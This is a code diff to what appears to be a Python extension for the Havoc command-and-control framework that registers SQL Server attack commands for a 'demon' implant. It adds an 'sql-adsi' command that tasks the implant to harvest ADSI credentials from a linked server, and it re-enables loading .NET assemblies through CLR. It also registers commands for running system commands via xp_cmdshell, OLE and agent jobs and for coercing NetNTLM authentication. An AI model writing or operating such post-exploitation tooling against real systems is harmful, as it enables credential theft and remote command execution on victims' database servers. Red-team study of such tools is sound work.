@@ -244,9 +244,9 @@ def clr_parse_params( demon, params ):
         return None
 
     if num_params >= 3:
-        server  = params[ 0 ]
-        dllpath = params[ 1 ]
-        func    = params[ 2 ]
+        server      = params[ 0 ]
+        dllpath     = params[ 1 ]
+        function    = params[ 2 ]
     if num_params >= 4:
         database = params[ 3 ]
     if num_params >= 5:
@@ -272,11 +272,69 @@ def clr_parse_params( demon, params ):
     packer.addbytes(dllbytes)
 
     return packer.getbuffer()
+
+
+def adsi_parse_params( demon, params ):
+    packer = Packer()
+
+    num_params = len(params)
+    
+    server      = ""
+    adsiserver  = ""
+    port        = ""
+    database    = ""
+    linkserver  = ""
+    impersonate = ""
+
+    if num_params > 6:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return None
+
+    if num_params < 2:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too few parameters" )
+        return None
+
+    if num_params >= 2:
+        server      = params[ 0 ]
+        adsiserver  = params[ 1 ]
+    if num_params >= 3:
+        port = params[ 2 ]
+    if num_params >= 4:
+        database = params[ 3 ]
+    if num_params >= 5:
+        linkserver = params[ 4 ]
+    if num_params >= 6:
+        impersonate = params[ 5 ]
+
+    packer.addstr(server)
+    packer.addstr(database)
+    packer.addstr(linkserver)
+    packer.addstr(impersonate)
+    packer.addstr(adsiserver)
+    packer.addstr(port)
+
+    return packer.getbuffer()
     
 
 ######
 # Funcs for commands
 ######
+
+def adsi( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    packed_params = adsi_parse_params( demon, params )
+    if packed_params is None:
+        return False
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to obtain ADSI creds from ADSI linked server" )
+
+    demon.InlineExecute( TaskID, "go", f"adsi/adsi.{demon.ProcessArch}.o", packed_params, False )
+
+    return TaskID
+
 
 def agentcmd( demonID, *params ):
     TaskID : str    = None
@@ -326,9 +384,6 @@ def checkrpc( demonID, *params ):
     return TaskID
 
 
-#
-# Unfinished
-#
 def clr( demonID, *params ):
     TaskID : str    = None
     demon  : Demon  = None
@@ -695,30 +750,30 @@ def xpcmd( demonID, *params ):
     return TaskID
 
 
-# add sql-adsi command
-RegisterCommand( agentcmd,      "", "sql-agentcmd",     "Execute a system command using agent jobs",                0, "[server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",             "" )
-RegisterCommand( agentstatus,   "", "sql-agentstatus",  "Enumerate SQL agent status and jobs",                      0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                       "" )
-RegisterCommand( checkrpc,      "", "sql-checkrpc",     "Enumerate RPC status of linked servers",                   0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                       "" )
-#RegisterCommand( clr,           "", "sql-clr",          "Load and execute .NET assembly in a stored procedure",     0, "[server] [dll_path] [function] [opt: database] [opt: linkedserver] [opt: impersonate]", "")
-RegisterCommand( columns,       "", "sql-columns",      "Enumerate columns within a table",                         0, "[server] [tables] [opt: database] [opt: linkedserver] [opt: impersonate]",              "" )
-RegisterCommand( databases,     "", "sql-databases",    "Enumerate SQL databases",                                  0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                       "" )
-RegisterCommand( disableclr,    "", "sql-disableclr",   "Disable CLR integration",                                  0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                       "" )	
-RegisterCommand( disableole,    "", "sql-disableole",   "Disable OLE Automation Procedures",	                    0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                       "" )	
-RegisterCommand( disablerpc,    "", "sql-disablerpc",	"Disable RPC and RPC out on a linked server",               0, "[server] [linkedserver] [opt: database] [opt: impersonate]",                            "" )
-RegisterCommand( disablexp,     "", "sql-disablexp",    "Disable xp_cmdshell" ,                                     0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                       "" )
-RegisterCommand( enableclr,     "", "sql-enableclr",    "Enable CLR integration",                                   0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                       "" )
-RegisterCommand( enableole,     "", "sql-enableole",    "Enable OLE Automation Procedures",                         0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                       "" )
-RegisterCommand( enablerpc,     "", "sql-enablerpc",    "Enable RPC and RPC out on a linked server",                0, "[server] [linkedserver] [opt: database] [opt: impersonate]",                            "" )
-RegisterCommand( enablexp,      "", "sql-enablexp",     "Enable xp_cmdshell",                                       0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                       "" )
-RegisterCommand( impersonate,   "", "sql-impersonate",  "Enumerate users that can be impersonated",                 0, "[server] [opt: database]",                                                              "" )
-RegisterCommand( info,          "", "sql-info",         "Gather information about the SQL server",                  0, "[server] [opt: database]",                                                              "" )
-RegisterCommand( links,         "", "sql-links",        "Enumerate linked servers",                                 0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                       "" )
-RegisterCommand( olecmd,        "", "sql-olecmd",       "Execute a system command using OLE automation procedures", 0, "[server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",             "" )
-RegisterCommand( query,         "", "sql-query",        "Execute a custom SQL query",                               0, "[server] [query] [opt: database] [opt: linkedserver] [opt: impersonate]",               "" )
-RegisterCommand( rows,          "", "sql-rows",         "Get the count of rows in a table",                         0, "[server] [table] [opt: database] [opt: linkedserver] [opt: impersonate]",               "" )
-RegisterCommand( search,        "", "sql-search",       "Search a table for a column name",                         0, "[server] [keyword] [opt: database] [opt: linkedserver] [opt: impersonate]",             "" )
-RegisterCommand( smb,           "", "sql-smb",          "Coerce NetNTLM auth via xp_dirtree",                       0, "[server] [\\\\listener] [opt: database] [opt: linkedserver] [opt: impersonate]",        "" )
-RegisterCommand( tables,        "", "sql-tables",       "Enumerate tables within a database",                       0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                       "" )
-RegisterCommand( users,         "", "sql-users",        "Enumerate users with database access",                     0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                       "" )
-RegisterCommand( whoami,        "", "sql-whoami",       "Gather logged in user, mapped user and roles",             0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                       "" )
-RegisterCommand( xpcmd,         "", "sql-xpcmd",        "Execute a system command via xp_cmdshell",                 0, "[server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",             "" )
+RegisterCommand( adsi,          "", "sql-adsi",         "Obtain ADSI creds from ADSI linked server",                0, "[server] [ADSI_linkedserver] [opt: port] [opt: database] [opt: linkedserver] [opt: impersonate]",   "" )
+RegisterCommand( agentcmd,      "", "sql-agentcmd",     "Execute a system command using agent jobs",                0, "[server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",                         "" )
+RegisterCommand( agentstatus,   "", "sql-agentstatus",  "Enumerate SQL agent status and jobs",                      0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
+RegisterCommand( checkrpc,      "", "sql-checkrpc",     "Enumerate RPC status of linked servers",                   0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
+RegisterCommand( clr,           "", "sql-clr",          "Load and execute .NET assembly in a stored procedure",     0, "[server] [dll_path] [function] [opt: database] [opt: linkedserver] [opt: impersonate]",             "" )
+RegisterCommand( columns,       "", "sql-columns",      "Enumerate columns within a table",                         0, "[server] [tables] [opt: database] [opt: linkedserver] [opt: impersonate]",                          "" )
+RegisterCommand( databases,     "", "sql-databases",    "Enumerate SQL databases",                                  0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
+RegisterCommand( disableclr,    "", "sql-disableclr",   "Disable CLR integration",                                  0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )	
+RegisterCommand( disableole,    "", "sql-disableole",   "Disable OLE Automation Procedures",	                    0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )	
+RegisterCommand( disablerpc,    "", "sql-disablerpc",	"Disable RPC and RPC out on a linked server",               0, "[server] [linkedserver] [opt: database] [opt: impersonate]",                                        "" )
+RegisterCommand( disablexp,     "", "sql-disablexp",    "Disable xp_cmdshell" ,                                     0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
+RegisterCommand( enableclr,     "", "sql-enableclr",    "Enable CLR integration",                                   0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
+RegisterCommand( enableole,     "", "sql-enableole",    "Enable OLE Automation Procedures",                         0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
+RegisterCommand( enablerpc,     "", "sql-enablerpc",    "Enable RPC and RPC out on a linked server",                0, "[server] [linkedserver] [opt: database] [opt: impersonate]",                                        "" )
+RegisterCommand( enablexp,      "", "sql-enablexp",     "Enable xp_cmdshell",                                       0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
+RegisterCommand( impersonate,   "", "sql-impersonate",  "Enumerate users that can be impersonated",                 0, "[server] [opt: database]",                                                                          "" )
+RegisterCommand( info,          "", "sql-info",         "Gather information about the SQL server",                  0, "[server] [opt: database]",                                                                          "" )
+RegisterCommand( links,         "", "sql-links",        "Enumerate linked servers",                                 0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
+RegisterCommand( olecmd,        "", "sql-olecmd",       "Execute a system command using OLE automation procedures", 0, "[server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",                         "" )
+RegisterCommand( query,         "", "sql-query",        "Execute a custom SQL query",                               0, "[server] [query] [opt: database] [opt: linkedserver] [opt: impersonate]",                           "" )
+RegisterCommand( rows,          "", "sql-rows",         "Get the count of rows in a table",                         0, "[server] [table] [opt: database] [opt: linkedserver] [opt: impersonate]",                           "" )
+RegisterCommand( search,        "", "sql-search",       "Search a table for a column name",                         0, "[server] [keyword] [opt: database] [opt: linkedserver] [opt: impersonate]",                         "" )
+RegisterCommand( smb,           "", "sql-smb",          "Coerce NetNTLM auth via xp_dirtree",                       0, "[server] [\\\\listener] [opt: database] [opt: linkedserver] [opt: impersonate]",                    "" )
+RegisterCommand( tables,        "", "sql-tables",       "Enumerate tables within a database",                       0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
+RegisterCommand( users,         "", "sql-users",        "Enumerate users with database access",                     0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
+RegisterCommand( whoami,        "", "sql-whoami",       "Gather logged in user, mapped user and roles",             0, "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
+RegisterCommand( xpcmd,         "", "sql-xpcmd",        "Execute a system command via xp_cmdshell",                 0, "[server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",                         "" )
